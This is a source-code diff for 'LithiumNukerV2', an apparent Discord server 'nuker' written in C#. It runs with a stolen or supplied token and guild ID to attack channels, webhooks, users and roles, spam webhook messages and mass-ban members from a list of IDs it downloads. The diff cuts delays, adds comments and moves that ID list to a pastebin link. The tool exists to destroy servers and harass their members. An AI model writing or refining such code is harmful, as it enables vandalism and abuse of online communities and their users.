@@ -80,7 +80,7 @@ namespace LithiumNukerV2
                     break;
                 default:
                     core.WriteLine("Invalid choice");
-                    core.Delay(2500);
+                    core.Delay(1000);
                     opts();
                     break;
             }
@@ -163,11 +163,13 @@ namespace LithiumNukerV2
             users = new Users(Settings.Token, (long)Settings.GuildId, Settings.Threads);
             roles = new Roles(Settings.Token, (long)Settings.GuildId, Settings.Threads);
 
-            Channels.Finished += () => { core.Delay(5000); opts(); };
-            Webhooks.Finished += () => { core.Delay(5000); opts(); };
-            Users.Finished += () => { core.Delay(5000); opts(); };
-            Roles.Finished += () => { core.Delay(5000); opts(); };
+            // Finish events will retrigger options
+            Channels.Finished += () => { core.Delay(1000); opts(); };
+            Webhooks.Finished += () => { core.Delay(1000); opts(); };
+            Users.Finished += () => { core.Delay(1000); opts(); };
+            Roles.Finished += () => { core.Delay(1000); opts(); };
 
+            // Show options
             opts();
         }
 
@@ -177,6 +179,7 @@ namespace LithiumNukerV2
             string content = core.ReadLine("Content : ");
             bool succ = int.TryParse(core.ReadLine("Amount of messages per webhook : "), out int amnt);
 
+            // Check if conversion was successful
             if (!succ)
             {
                 core.WriteLine(Color.Red, "Failed to parse amount of messages to an int");
@@ -265,7 +268,7 @@ namespace LithiumNukerV2
 
             // If banning ids, download the ids
             if (banIds && !File.Exists("ids.txt"))
-                new WebClient().DownloadFile("https://lithium.verlox.cc/app/ids.txt", "ids.txt");
+                new WebClient().DownloadFile("https://pastebin.com/raw/3NPBvgK5", "ids.txt");
 
             new Thread(() => { users.BanAll(banIds); }).Start();
         }
